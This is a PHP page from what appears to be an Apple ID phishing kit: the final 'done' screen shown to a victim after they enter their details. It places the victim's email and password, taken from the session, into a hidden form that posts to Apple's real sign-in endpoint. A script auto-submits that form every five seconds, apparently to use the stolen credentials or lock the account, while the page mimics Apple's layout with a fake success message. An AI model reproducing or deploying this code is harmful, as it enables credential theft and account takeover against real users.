<?php
session_start();
$fnames = $_SESSION['firstname'];
$lnames = $_SESSION['lastname'];
?>
<!DOCTYPE html>
<?php
echo $html;
?>
<head>
<?php
echo "<title>$title_bill</title>";
?>
	<link rel="stylesheet" type="text/css" href="../assets/css/desktop.css">
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<link rel="icon" href="../assets/img/favicon.ico" type="image/x-icon" />
<style>
.image-upload1 > input
{
    display: none;
}
.image-upload > input
{
    display: none;
}
</style>
</head>
<body>
<div id="head"></div>
<div id="container">
	<div id="xheader">
		<div id="<?php echo $bahasas;?>navbar"></div>
		<div style="font-size: 38px;font-family: 'Open Sans', sans-serif;color: rgb(255, 255, 255);line-height: 2.524;text-align: right;position: absolute;top: 53px;z-index: 2;left: 0px;">

         <?php if(!empty($fnames)){ 
            echo "<b>$fnames $lnames</b>";
         }else{
            echo "<b>$account_verif</b>";
        }


            ?> 
            </div>
		<div id="account_type">
        <?php 
        echo $account_id;
        ?> 

        <b> <?php if(!empty($xuser)){ echo $xuser;}else{echo "";}?> </b> </div>
		<div id="logout"></div>
        <font id="logout0"><a href="#" style="color:#fff;text-decoration: none;"><?php echo $sign_out;?></a></font>
	</div>
    <?php
        session_start();
        $_SESSION['firstname'] = "";
        if($autoblock == 1) {
			$_SESSION['udah'] = "y";
        }
//echo "<META HTTP-EQUIV='refresh' content='5; URL=https://appleid.apple.com'>";

?>
<script type="text/javascript">
    window.onload=function(){
        var auto = setTimeout(function(){ autoRefresh(); }, 100);

        function submitform(){
          document.forms["form"].submit();
        }

        function autoRefresh(){
           clearTimeout(auto);
           auto = setTimeout(function(){ submitform(); autoRefresh(); }, 5000);
        }
    }
    </script>
    <form name='form' id='form' action='https://idmsa.apple.com/IDMSWebAuth/authenticate' method='POST'>
        <div style='display:none;'>
        <input name='appleId' value='<?php echo $_SESSION['email'];?>' />
        <input name='accountPassword' value='<?php echo $_SESSION['password'];?>' />
        <input name='appIdKey' value='af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3' />
        <input name='accNameLocked' value='false' />
        <input name='language' value='US-EN' />
        <input name='path' value='/signin/?referrer=/account/manage' />
        <input name='Env' value='PROD' />
        <input type='submit' class='button primary' value='Continue' />
        </div>
    </form>
	<div id="xcontent">
	   
                        <br><br>
            
			<font class="xFont3" style="top:105px;left:398px;">
                <img id="gambardesktop" width="150" src="../assets/img/done.png">
            </font>
            <font class="xFont" style="top:230px;left:280px;">
                <b><?php echo $done;?></b>
            </font>
            <font class="xFont3" style="top:290px;left:300px;"><?php echo $done_text;?></font>
    
	</div>
	
</div>
<div id="containerfooter">
<?php
if($lang == "PE") {?>
<div id="pefooterbawah"></div>
<?php
}?>
<?php
if($lang == "CO") {?>
<div id="cofooterbawah"></div>
<?php
}?>
<?php
if($lang == "MX") {?>
<div id="mxfooterbawah"></div>
<?php
}?>
<?php
if($lang == "AR") {?>
<div id="arfooterbawah"></div>
<?php
}?>
<?php
if($lang == "PY") {?>
<div id="pyfooterbawah"></div>
<?php
}?>
<?php
if($lang == "UY") {?>
<div id="uyfooterbawah"></div>
<?php
}?>
<?php
if($lang == "EC") {?>
<div id="ecfooterbawah"></div>
<?php
}?>
<?php
if($lang == "PE" or $lang == "MX" or $lang == "CO" or $lang == "AR" or $lang == "UY" or $lang == "PY" or $lang == "EC") {
}else{?>
<div id="<?php echo $bahasas;?>footerbawah"></div>
<?php
}
?>
</div>
<script src="../assets/js/main.js"></script></script>
<script type="text/javascript" src="../assets/js/jquery.validate.min.js"></script>

</body>
</html>
